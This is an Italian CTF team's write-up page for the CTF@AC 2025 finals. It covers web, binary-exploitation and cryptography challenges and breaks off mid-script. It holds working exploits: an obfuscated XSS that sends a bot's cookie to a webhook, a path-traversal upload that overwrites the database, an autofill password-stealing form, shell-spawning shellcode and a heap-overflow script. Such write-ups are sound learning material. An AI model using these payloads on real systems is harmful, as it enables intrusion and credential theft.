<!DOCTYPE html>
<html lang="it" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Finali CTF@AC 2025 | Paolo</title>
<meta name="keywords" content="ctfatac, ctf, binary, crypto, web, ctfatac2025">
<meta name="description" content="Tutti i writeup della finale di CTF@AC, edizione 2025.">
<meta name="author" content="Paolo">
<link rel="canonical" href="https://pascalctf.github.io/en/ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.60a7a0a9923d020b71b53396c3a1eaa79c12b0e020c91cc166667dfe8ed1086c.css" integrity="sha256-YKegqZI9AgtxtTOWw6Hqp5wSsOAgyRzBZmZ9/o7RCGw=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://pascalctf.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pascalctf.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://pascalctf.github.io/favicon.ico">
<link rel="apple-touch-icon" href="https://pascalctf.github.io/favicon.ico">
<link rel="mask-icon" href="https://pascalctf.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://pascalctf.github.io/en/ctf/ctfatac2025_finals/">
<link rel="alternate" hreflang="it" href="https://pascalctf.github.io/it/ctf/ctfatac2025_finals/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css" integrity="sha384-5TcZemv2l/9On385z///+d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.js" integrity="sha384-cMkvdD8LoxVzGF/RPUKAcvmm49FQ0oxwDF3BGKtDXcEc+T1b2N+teh/OJfpU0jr6" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          throwOnError : false
        });
    });
</script>

<meta property="og:url" content="https://pascalctf.github.io/it/ctf/ctfatac2025_finals/">
  <meta property="og:site_name" content="Paolo">
  <meta property="og:title" content="Finali CTF@AC 2025">
  <meta property="og:description" content="Tutti i writeup della finale di CTF@AC, edizione 2025.">
  <meta property="og:locale" content="it">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-11-09T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-09T00:00:00+00:00">
    <meta property="article:tag" content="Ctfatac">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Binary">
    <meta property="article:tag" content="Crypto">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Ctfatac2025">
    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
<meta name="twitter:title" content="Finali CTF@AC 2025">
<meta name="twitter:description" content="Tutti i writeup della finale di CTF@AC, edizione 2025.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Capture The Flag üö©",
      "item": "https://pascalctf.github.io/it/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Finali CTF@AC 2025",
      "item": "https://pascalctf.github.io/it/ctf/ctfatac2025_finals/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Finali CTF@AC 2025",
  "name": "Finali CTF@AC 2025",
  "description": "Tutti i writeup della finale di CTF@AC, edizione 2025.",
  "keywords": [
    "ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"
  ],
  "articleBody": " Finali CTF@AC 2025 Abbiamo (Paolo) partecipato a questo CTF a Timi»ôoara da ven 07 nov. 2025, 16:00 CET a dom 09 nov. 2025, 10:00 CET, arrivando secondi assoluti ü•≥.\nAnche se era la nostra prima esperienza CTF in un contesto internazionale, ci siamo davvero divertiti a risolvere queste challenge.\nI componenti del team che hanno partecipato:\nMarco Balducci (@Cryingfreeman74) Alan Davide Bovo (@Hecker404) Enea Maroncelli (@Zazaman) Web üåê Silicon Dioxide Analisi Questa challenge forniva il codice sorgente di un‚Äôapplicazione web Node.js progettata per scrivere e condividere codice JavaScript ‚Äúsandboxato‚Äù per modificare un canvas. C‚Äôerano sia un frontend sia un backend che gestivano l‚Äôesecuzione del JavaScript.\nFrontend Il frontend implementava un ambiente ‚Äúsandboxato‚Äù fatto in casa per eseguire il codice JavaScript come segue:\n/** * Super Duper Sandbox */ function canvasSandbox(code) { try { const sandboxFunc = new Function( \"canvas\", ` const window = undefined; const document = undefined; const alert = undefined; const console = undefined; const eval = undefined; const Function = undefined; const setTimeout = undefined; const setInterval = undefined; const fetch = undefined; const XMLHttpRequest = undefined; const WebSocket = undefined; const localStorage = undefined; const sessionStorage = undefined; const location = undefined; const history = undefined; const navigator = undefined; const parent = undefined; const top = undefined; const self = undefined; const globalThis = undefined; canvas.constructor = null; canvas.__proto__.constructor = null; canvas.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null; ${code} ` ); sandboxFunc.call(null, canvas); } catch (err) { alert(\"Sorry, your code did not run.\"); } } Forniva anche una funzione che eseguiva automaticamente qualsiasi codice JavaScript passato tramite il parametro di query /?code= all‚Äôinterno di questo ambiente sandboxato.\nBackend Il backend era responsabile della condivisione del codice e includeva un ulteriore livello di controlli:\nconst allowed_keywords = [ \"const\", \"ctx\", \"canvas\", \"getContext\", \"console\", \"let\", \"vx\", \"vy\", \"radius\", \"function\", \"update\", \"clearRect\", \"width\", \"height\", \"if\", \"beginPath\", \"arc\", \"Math\", \"PI\", \"fillStyle\", \"orange\", \"fill\", \"requestAnimationFrame\" ]; function checkCode(code) { const matches = code.match(/[A-Za-z]{2,}/g) || []; const disallowed = matches.filter((k) =\u003e !allowed_keywords.includes(k)); return disallowed.length === 0; } L‚Äôendpoint /share funzionava cos√¨:\nControllava la presenza di parole chiave non consentite nel codice. Faceva eseguire il codice da un bot Chromium usando l‚Äôendpoint /?code=. Tuttavia, la vulnerabilit√† principale era nel cookie della flag ‚Äî era salvato con httpOnly: false, il che significa che un semplice XSS poteva rubarlo facilmente.\ncontext.addCookies([ { name: \"flag\", domain: \"localhost\", path: \"/\", value: FLAG, sameSite: \"Lax\", secure: false, httpOnly: false } ]); Soluzione Dopo aver analizzato l‚Äôintera challenge, trovare una soluzione funzionante √® stato semplice. Il controllo delle parole chiave del backend poteva essere bypassato usando la codifica UTF-8 (aggirando la regex [A-Za-z]{2,}). Poi, il frontend poteva essere sfruttato usando la parola chiave this.\nIl frontend rimuoveva solo i riferimenti diretti alla maggior parte delle funzioni JavaScript, ma non sanitizzava correttamente gli accessi tramite il vero contesto window o document.\nUna volta capito questo, abbiamo scritto un exploit completamente funzionante che esfiltrava il cookie dell‚Äôadmin usando una richiesta fetch verso il nostro webhook.\nExploit const ctx = canvas.getContext('2d'); const p = ctx['\\u005f\\u005f\\u0070\\u0072\\u006f\\u0074\\u006f\\u005f\\u005f']; const c = p['\\u0063\\u006f\\u006e\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u006f\\u0072']; const f = c['\\u0063\\u006f\\u006e\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u006f\\u0072']; const g = f('\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0074\\u0068\\u0069\\u0073')(); const d = g['\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074']; const s = d['\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065']; const e = g['\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u0055\\u0052\\u0049\\u0043\\u006f\\u006d\\u0070\\u006f\\u006e\\u0065\\u006e\\u0074']; const h = g['\\u0066\\u0065\\u0074\\u0063\\u0068']; const u = e(s); h('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0077\\u0065\\u0062\\u0068\\u006f\\u006f\\u006b\\u002e\\u0073\\u0069\\u0074\\u0065\\u002f\\u0035\\u0063\\u0035\\u0038\\u0037\\u0066\\u0037\\u0061\\u002d\\u0031\\u0063\\u0030\\u0030\\u002d\\u0034\\u0035\\u0038\\u0032\\u002d\\u0061\\u0035\\u0062\\u0033\\u002d\\u0031\\u0061\\u0030\\u0038\\u0064\\u0065\\u0032\\u0031\\u0032\\u0033\\u0061\\u0062\\u003f\\u0064\\u003d' + u); Una volta eseguito, la flag appariva nei log del webhook come:\nd=flag=CTF{c0d2d75449e3167001cbb38b891a78c8168c165d2cbd48f8f7b3123759963f66}\nRetro Forum Analisi Retro Forum era una piattaforma di post/chat dove gli utenti potevano condividere pensieri e gli amministratori moderarli.\nIl sorgente mostrava come era strutturato e dove era salvato il database SQLite, oltre alla vulnerabilit√† principale in questa route:\n@app.route('/edit_profile', methods=['GET', 'POST']) def edit_profile(): if 'user_id' not in session: return redirect(url_for('login')) conn = get_db() c = conn.cursor() if request.method == 'POST': new_bio = request.form['bio'] filename = None if 'profile_pic' in request.files: file = request.files['profile_pic'] if file: filename = file.filename print(filename) file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) c.execute(\"UPDATE users SET profile_pic=? WHERE id=?\", (filename, session['user_id'])) c.execute(\"UPDATE users SET bio=? WHERE id=?\", (new_bio, session['user_id'])) conn.commit() conn.close() return redirect(url_for('profile', id=session['user_id'])) c.execute(\"SELECT bio, profile_pic FROM users WHERE id=?\", (session['user_id'],)) bio, pic = c.fetchone() conn.close() return render_template('edit_profile.html', bio=bio, pic=pic) Qui l‚Äôimmagine caricata dall‚Äôutente veniva salvata senza alcuna sanitizzazione o validazione, lasciando la piattaforma vulnerabile a un attacco di path traversal, che permetteva all‚Äôutente di sovrascrivere qualsiasi file con l‚Äôimmagine caricata.\nPrima della soluzione, √® importante notare l‚Äôesistenza dell‚Äôendpoint debug_file:\n@app.route('/debug/') def debug_file(filename): if not session.get('is_admin'): return redirect(url_for('login')) try: file_path = os.path.join(os.getcwd(), filename) with open(file_path, 'r') as f: content = f.read() return content, 200, {'Content-Type': 'text/plain'} except Exception as e: return f\"Error: {str(e)}\", 404 Questo endpoint forniva in seguito lettura arbitraria dell‚Äôintero filesystem, permettendoci di recuperare la flag.\nSoluzione Una volta confermata la vulnerabilit√† di path traversal, il passo successivo √® stato sovrascrivere il file retro.db caricando un file malevolo chiamato ../../retro.db tramite il form di upload dell‚Äôimmagine profilo.\nDopo aver sovrascritto con successo il database, ho ottenuto privilegi admin, che mi hanno consentito di usare un‚Äôaltra vulnerabilit√† di path traversal nell‚Äôendpoint debug file per leggere file arbitrari.\nDa l√¨ ho scaricato flag.txt\ngAAAAABpDfJWpJyLk4xz6hJCspj6XEpp0dCKgZUegC18TYQHfABujfRSTCa0zEei6qnDP6k8I-2V0by1aeJSEhKhhWI5EWppnQ== e populate.py, che conteneva la logica di inizializzazione del database.\nDentro populate.py ho trovato dati di default degli utenti e post, incluso un utente Josh, che menzionava spesso la sua password nei post e nelle chat.\nAnalizzandoli, ho dedotto che la password di Josh veniva usata come chiave per cifrare la flag con Fernet. Usando questo indizio, ho forzato tutte le combinazioni possibili dei frammenti della sua password finch√© la flag non si √® decrittata correttamente.\nScript Sono stati usati diversi script per risolvere la challenge, ma i due pi√π importanti sono l‚Äôexploit per ottenere i privilegi admin e lo script di brute-force della password.\nExploit per privilegi admin #!/usr/bin/env python3 import requests import sys, os import sqlite3, tempfile from werkzeug.security import generate_password_hash URL = sys.argv[1] assert requests.get(f\"{URL}/\").status_code == 200 def init_db(filename=\"retro.db\"): conn = sqlite3.connect(filename) c = conn.cursor() c.execute('''CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, bio TEXT, is_admin INTEGER DEFAULT 0, profile_pic TEXT DEFAULT 'default.png' )''') c.execute('''CREATE TABLE posts ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, title TEXT, content TEXT, FOREIGN KEY (user_id) REFERENCES users(id) )''') c.execute('''CREATE TABLE comments ( id INTEGER PRIMARY KEY AUTOINCREMENT, post_id INTEGER, user_id INTEGER, content TEXT, FOREIGN KEY (post_id) REFERENCES posts(id), FOREIGN KEY (user_id) REFERENCES users(id) )''') c.execute('''CREATE TABLE chats ( id INTEGER PRIMARY KEY AUTOINCREMENT, user1_id INTEGER, user2_id INTEGER, FOREIGN KEY (user1_id) REFERENCES users(id), FOREIGN KEY (user2_id) REFERENCES users(id) )''') c.execute('''CREATE TABLE messages ( id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, sender_id INTEGER, content TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY (chat_id) REFERENCES chats(id), FOREIGN KEY (sender_id) REFERENCES users(id) )''') c.execute(\"INSERT INTO users (username, password, bio, is_admin) VALUES (?, ?, ?, 1)\", (\"admin\", generate_password_hash(\"admin123\"), \"Retro overlord\")) conn.commit() conn.close() s = requests.Session() s.post(f\"{URL}/register\", data={ \"username\": (username := os.urandom(20).hex()), \"password\": (password := os.urandom(20).hex()), \"bio\": \"hello\", }) s.post(f\"{URL}/login\", data={ \"username\": username, \"password\": password, }) with tempfile.NamedTemporaryFile(\"w+b\") as tf: print(tf.name) init_db(tf.name) s.post(f\"{URL}/edit_profile\", data={ \"bio\": \"palle\", }, files={ \"profile_pic\": (\"../../retro.db\", tf, \"image/jpeg\"), }) print(\"[*] Uploaded malicious profile picture\") s.get(f\"{URL}/logout\") r = s.post(f\"{URL}/login\", data={ \"username\": \"admin\", \"password\": \"admin123\", }) print(s.cookies.get_dict()) Script di brute-force della password N.B.: Le liste d e n contenevano parole e date trovate nelle chat di Josh, che suggerivano la struttura della password.\nimport base64, itertools from cryptography.fernet import Fernet from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC d = ['20.05.2023', '14.03.2001'] n = ['pixel', 'wigglepuff'] i = n + d l = list(itertools.permutations(i)) for perm in l: password = \".\".join(perm).encode() salt = b\"whatever\" kdf = PBKDF2HMAC( algorithm=hashes.SHA256(), length=32, salt=salt, iterations=390000, ) key = base64.urlsafe_b64encode(kdf.derive(password)) f = Fernet(key) with open(\"flag.txt\", \"rb\") as fh: token = fh.read() try: plaintext = f.decrypt(token) print(f\"Password trovata: {password.decode()}\") print(plaintext.decode()) break except: continue Questa combinazione di exploit e analisi ha portato alla decrittazione della flag e al completamento della challenge.\nNot wordle Analisi Questa challenge era una piattaforma tipo Wordle in Node.js dove si potevano indovinare parole casuali (tutte esattamente di 5 caratteri).\nTuttavia, la challenge forniva un interruttore per parole ‚Äúrandom‚Äù/‚Äúdaily‚Äù. Quest‚Äôultimo usava un codice speciale wotd. Dopo aver analizzato per un po‚Äô il backend ho trovato questo snippet che implementava la logica di generazione della parola.\nfunction getSecret(mode, cookies) { const m = (mode || cookies.mode || 'random').toLowerCase(); if (m === 'wotd') { const flag = (process.env.FLAG || 'REAL_FLAG_ON_REMOTE').toLowerCase(); return { mode: 'wotd', secret: flag }; } let secret = cookies.randomSecret; if (!secret || !/^[a-z]{5}$/.test(secret)) { secret = pickRandomWord(); } return { mode: 'random', secret }; } √à chiaro che la flag fosse la parola del giorno sulla piattaforma e che, in pratica, bastava trovarla.\nSoluzione Poich√© la challenge non memorizzava alcun contatore per il numero di tentativi, trovare la flag con un brute force era banale.\nInoltre, la challenge non controllava nemmeno la lunghezza del tentativo, quindi si poteva anche forzare la parola carattere per carattere usando l‚Äôalfabeto 0123456789abcdefCTF{}.\nScript #!/usr/bin/env python3 import string, requests URL = \"http://a733fa9b.ctf.ac.upt.ro\" LENGTH = 69 CHARSET = 'CTF{}' + string.hexdigits.lower() s = requests.Session() s.post(URL + \"/api/start?mode=wotd\") flag = '' for i in range(LENGTH): for c in CHARSET: r = s.post(URL + \"/api/check\", json={\"guess\": flag + c}).json() if r['feedback'][i][\"status\"] == \"correct\": flag += c print(flag) break print(\"FLAG:\", flag) lolchat2 Analisi Questa challenge era un sequel dell‚Äôoriginale lolchat, che non avevamo risolto durante le qualificazioni. Forniva una chat basata su stanze sviluppata con WebSocket in un ambiente black-box, senza accesso al codice backend, quindi sono state necessarie diverse assunzioni.\nCome nell‚Äôoriginale, le prime tre stanze non rispondevano ai nostri messaggi. Tuttavia, nelle stanze party e game c‚Äôerano utenti che scambiavano messaggi casuali.\nLa pi√π interessante era game, dove l‚Äôutente tom inviava ripetutamente gli stessi messaggi, chiedendo aiuto per trovare la sua password (la flag). I messaggi pi√π significativi includevano:\n‚Äúi think i had a password saved in my browser‚Äù ‚Äúit would usually fill it out for me‚Äù Soluzione Dopo alcune rapide osservazioni, √® risultato chiaro che la piattaforma era fortemente vulnerabile a XSS (Cross-Site Scripting); l‚Äôunica validazione reale era lato client, applicata solo quando si inviavano messaggi, non quando si ricevevano.\nInizialmente abbiamo provato a reindirizzare il bot al nostro webhook, ma non ha funzionato: probabilmente era limitato alla sua rete localhost. Abbiamo quindi ipotizzato che l‚Äôapproccio migliore fosse far inviare al bot un messaggio nella chat contenente dati sensibili usando il nostro script iniettato, e questa volta ha funzionato.\nInfine, abbiamo capito che potevamo far autocompilare al browser del bot un campo password (usando le credenziali salvate) e inviare il valore direttamente in chat, visibile a tutti.\nScript Di seguito l‚ÄôHTML che abbiamo usato per risolvere la challenge. Si basa sull‚Äôassunzione che il browser del bot compili automaticamente l‚Äôinput password, attivando l‚Äôevento oninput, che poi invia il messaggio nella stanza game.\n\u003cform\u003e \u003cinput type=\"password\" name=\"password\" autocomplete oninput=\"window.socket.emit('sendMessage', { room: 'game', message: document.getElementsByName('password')[0].value });\"\u003e \u003c/form\u003e Exploitation binaria üè¥‚Äç‚ò†Ô∏è baby-ikea Analisi La challenge permetteva di connettersi via netcat al server e inviare dei dati. Dagli errori restituiti dal servizio, era chiaro che si potessero inviare solo dati codificati in base64.\nHo provato alcune istruzioni assembly a caso e ho scoperto che l‚Äôarchitettura era a 32 bit e che eseguiva codice asm arbitrario.\nSoluzione La soluzione prevedeva la scrittura di uno script asm completo nella struttura corretta e fargli fare ci√≤ che volevamo. Ho deciso di far avviare una shell, poi ho codificato lo script in base64 e l‚Äôho inviato al server.\nScript from pwn import * import base64 p = remote('?', ?) ## Chiama execve('/bin/sh') e spawna una shell shellcode = \"\"\" section .data path db '/bin/sh', 0 envp dd 0 section .text global _start _start: mov eax, 11 ; syscall number for execve mov ebx, path ; filename pointer mov edx, envp ; envp pointer int 0x80 ; call kernel mov eax, 1 xor ebx, ebx int 0x80 \"\"\" p.sendlineafter('\u003e ', base64.b64encode(shellcode.encode()).decode()) p.interactive() Tetrastack Analisi Tetrastack √® un servizio che ci permette di giocare a Tetris.\nAnalizzando le varie voci di menu, si nota un‚Äôopzione per salvare il proprio nome, ma solo a partita finita. La funzione decompilata set_name √® la seguente:\nvoid __cdecl set_name(Player *p) { size_t v1; // rax signed __int64 got; // [rsp+20h] [rbp-10h] signed __int64 n; // [rsp+28h] [rbp-8h] if ( board-\u003egame_over ) { puts(\"\\nEnter display name length:\"); n = read_long(); if ( n \u003e 0 ) { puts(\"Enter display name bytes:\"); got = read_n((unsigned __int8 *)p-\u003ename, n); ... Come si vede, c‚Äô√® una vulnerabilit√† nel modo in cui viene letta la lunghezza del nome. Esiste un controllo sul limite inferiore (n \u003e 0) ma non su quello superiore (n \u003c 64), quindi possiamo inviare ad esempio 255 per effettuare un buffer overflow.\nPer ottenere qualcosa dall‚Äôoverflow, dobbiamo capire dove si trova player-\u003ename in memoria e cosa c‚Äô√® subito dopo.\nLa risposta sta nella main:\nplayer = (Player *)calloc(1u, 0x10u); player-\u003ename_cap = 64; v4 = player; v4-\u003ename = (char *)malloc(player-\u003ename_cap); callbacks = (Callbacks *)malloc(0x10u); callbacks-\u003eon_gameover = real_gameover; callbacks-\u003eon_lineclear = 0; Come si vede, il nome sta sull‚Äôheap, e subito dopo c‚Äô√® una struct Callbacks che contiene due puntatori a funzione: on_gameover e on_lineclear.\nSoluzione Con l‚Äôaiuto di GDB ho trovato gli offset precisi sull‚Äôheap e ho potuto sovrascrivere il puntatore a funzione on_gameover con l‚Äôindirizzo di win.\nScript #!/usr/bin/env python3 from pwn import * elf = ELF(\"./tetrastack_patched\") context.binary = elf context.terminal = ('kgx', '-e') def conn(): if args.REMOTE: r = remote(\"8a0e1141.ctf.ac.upt.ro\", 9449) elif args.GDB: r = gdb.debug(elf.path, ''' b main b set_name continue ''') else: r = process(elf.path) return r def wait_menu_or_prompt(io, prompt=b\"8) Quit\"): data = b\"\" while True: chunk = io.recvuntil(b\"\\n\", timeout=0.5) if not chunk: continue data += chunk if b\"Enter display name length\" in data: return data, True if prompt in data: return data, False def reach_game_over(io, max_steps=2000): data, got_prompt = wait_menu_or_prompt(io) if got_prompt: return for _ in range(max_steps): io.sendline(b\"1\") data, got_prompt = wait_menu_or_prompt(io) if got_prompt: log.info(\"Reached name prompt\") return raise RuntimeError(\"Failed to trigger game over\") def main(): r = conn() reach_game_over(r) r.sendline(b'88') r.sendlineafter(b'bytes:', b'a' * 80 + p64(elf.sym.win)) r.sendline(b'8') x = r.recvall(timeout=1).decode() r.close() print(x) # r.interactive() if __name__ == \"__main__\": main() mini-e8 Analisi mini-e8 √® un piccolo binario tipo REPL ‚Äúengine‚Äù. Il costruttore dell‚ÄôEngine legge flag.txt, calcola un checksum XOR scorrevole da 64 byte, lo fa XOR con 0x7E3A829F e memorizza un flag_header di 16 byte seguito dai byte della flag in un‚Äôarena puntata da (QWORD*)Engine + 5. Un buffer di byte in stile JS condivide questa arena davanti al flag_header.\nLayout dell‚Äôheader (dword little-endian) flag_header[0] = 0x00000001 # deve essere forzato a 0 per getflag flag_header[1] = checksum(flag)^0x7E3A829F flag_header[2] = 0x8BADF00D # costante magica controllata da getflag flag_header[3] = 0x00000000 # diventa il nostro ‚Äúunlock‚Äù; serve 42 prima della seconda opt I byte della flag iniziano a flag_header + 0x10.\nFunzioni critiche Engine::Engine: scrive flag_header + flag nell‚Äôarena;\ncompute_checksum(flag): XOR scorrevole dei primi 64 byte poi XOR con 0x7E3A829F.\ncmd_optimize_function (opt): Prima chiamata abilita la ‚Äúfast mode‚Äù (scrive capacit√† di check). Seconda chiamata: se flag_header[3] == 42, imposta un byte di enable a Engine+0x80 a 1.\ncmd_getflag (getflag) richiede:\nflag_header[2] == 0x8BADF00D checksum ricalcolato ^ 0x7E3A829F == flag_header[1] flag_header[0] == 0 byte di enable a Engine+0x80 == 1 Vulnerabilit√† In fast mode, write valida idx \u003c capacity invece di idx \u003c length. La capacit√† \u003e lunghezza, quindi indici oltre il corpo logico del buffer (\u003e= length corrente) possono raggiungere il flag_header adiacente. Questo d√† scritture a singolo byte controllate sui campi dell‚Äôheader.\nif ( *((_BYTE *)this + 0x20) \u0026\u0026 a2 \u003c *((_QWORD *)this + 5) || a2 \u003c *((_QWORD *)this + 2) ) { result = *(_QWORD *)this; *(_BYTE *)(*((_QWORD *)this + 1) + **(_QWORD **)this + a2) = a3; } Offset mappati ai byte dell‚Äôheader Dopo la prima opt, dato che il flag_header √® posizionato dopo il buffer in memoria, i seguenti indici (nella REPL) indirizzano il flag_header:\n64..67 -\u003e flag_header[0] 68..71 -\u003e flag_header[1] 72..75 -\u003e flag_header[2] 76..79 -\u003e flag_header[3] Ci basta cambiare flag_header[0] (impostare tutti e quattro i byte a 0) e flag_header[3] (impostare il byte meno significativo a 42 e azzerare il resto) prima di invocare la seconda opt.\nSoluzione Eseguire opt una volta per entrare nella modalit√† veloce (controllo su capacity). Azzerare flag_header[0] scrivendo 0 agli offset 64‚Äì67. Impostare il valore di sblocco: scrivere i byte 76‚Äì79 come 42, 0, 0, 0 cos√¨ che flag_header[3] == 42. Chiamare opt di nuovo; la seconda ottimizzazione vede header[3] == 42 e attiva il byte di enable. Chiamare getflag; tutte le condizioni sono soddisfatte e stampa la flag da header+0x10. opt write 64 0 write 65 0 write 66 0 write 67 0 write 76 42 write 77 0 write 78 0 write 79 0 opt getflag Script steps = [ b\"opt\", # entra nel fast path b\"write 64 0\", # flag_header[0] byte 0 b\"write 65 0\", # flag_header[0] byte 1 b\"write 66 0\", # flag_header[0] byte 2 b\"write 67 0\", # flag_header[0] byte 3 b\"write 76 42\", # flag_header[3] byte 0 -\u003e 42 b\"write 77 0\", # azzera i restanti b\"write 78 0\", b\"write 79 0\", b\"opt\", # seconda optimize attiva se header[3]==42 b\"getflag\", # stampa la flag se i check passano ] Crittografia üîë Sparse Hills Analisi Abbiamo modellato il servizio come un semplice cifrario lineare su Z_257, dove il server calcola $c = K m \\bmod 257$. La stessa matrice chiave 257√ó257 √® riutilizzata, gli input sono zero-padding fino a un blocco intero, e gli output sono stampati come numeri esadecimali a tre cifre. Poich√© l‚Äôoracolo consente di cifrare qualsiasi cosa e la mappatura √® lineare, possiamo rivelare le colonne di $K$ cifrando i vettori base. Questo significa che possiamo recuperare la chiave e, da l√¨, la flag.\nSoluzione Per prima cosa prendo la flag cifrata cos√¨ abbiamo il suo ciphertext. Poi cifriamo ciascun vettore canonico, una posizione a 1 e il resto a 0. Ogni query restituisce una colonna di $K$. Impilandole, ricostruiamo l‚Äôintera matrice. Inverto questa matrice modulo 257 con Gauss-Jordan (gli inversi di Fermat rendono facile la divisione), moltiplico l‚Äôinversa per il ciphertext della flag per ottenere il vettore di plaintext, converto 256 in 0 quando trasformo in byte, rimuovo lo zero-padding e decodifico in UTF-8. Servono esattamente 257 cifrature per il recupero, e l‚Äôinversione √® veloce a questa dimensione.\nScript import socket import sys import re from typing import List P = 257 # Prime modulus N = 257 # Block length == dimension def recv_until(sock: socket.socket, marker: bytes) -\u003e bytes: \"\"\"Read from socket until `marker` appears.\"\"\" buf = bytearray() while marker not in buf: chunk = sock.recv(4096) if not chunk: break buf += chunk return bytes(buf) def recv_all(sock: socket.socket) -\u003e bytes: \"\"\"Read until the socket is closed and return all bytes.\"\"\" buf = bytearray() while True: chunk = sock.recv(65536) if not chunk: break buf += chunk return bytes(buf) HEX3_RE = re.compile(r\"^(?:[0-9a-f]{3}\\s+){256}[0-9a-f]{3}$\", re.IGNORECASE) def parse_hex_vector(blob: bytes) -\u003e List[int]: \"\"\"Extract the final 257-entry hex vector from a server response.\"\"\" text = blob.decode(errors=\"ignore\") for line in reversed(text.strip().splitlines()): line = line.strip() if HEX3_RE.fullmatch(line): return [int(tok, 16) for tok in line.split()] raise ValueError(\"Could not find a valid ciphertext line in server output.\") # Oracle wrappers def get_encrypted_flag(host: str, port: int) -\u003e List[int]: \"\"\"Request option 1 from the server and parse the returned ciphertext.\"\"\" s = socket.socket() s.connect((host, port)) recv_until(s, b\"\u003e \") s.sendall(b\"1\\n\") data = recv_all(s) s.close() return parse_hex_vector(data) def encrypt(host: str, port: int, block: bytes) -\u003e List[int]: \"\"\"Request option 2 and send a 257-byte block, returning the ciphertext.\"\"\" assert len(block) == N, \"block must be exactly N=257 bytes\" s = socket.socket() s.connect((host, port)) recv_until(s, b\"\u003e \") s.sendall(b\"2\\n\") recv_until(s, b\"\u003e \") s.sendall(block) data = recv_all(s) s.close() return parse_hex_vector(data) # Modular algebra def mat_inv_mod_p(A: List[List[int]], p: int) -\u003e List[List[int]]: \"\"\"Compute the inverse of A modulo prime p using Gauss-Jordan.\"\"\" n = len(A) M = [[A[i][j] % p for j in range(n)] for i in range(n)] I = [[1 if i == j else 0 for j in range(n)] for i in range(n)] for col in range(n): # Find a pivot row with nonzero in column 'col' pivot = col while pivot \u003c n and M[pivot][col] == 0: pivot += 1 if pivot == n: raise ValueError(\"Matrix not invertible (no pivot).\") # Swap to current row if needed if pivot != col: M[col], M[pivot] = M[pivot], M[col] I[col], I[pivot] = I[pivot], I[col] # Normalize pivot row inv_piv = pow(M[col][col], p - 2, p) # Fermat inverse (p is prime) for j in range(n): M[col][j] = 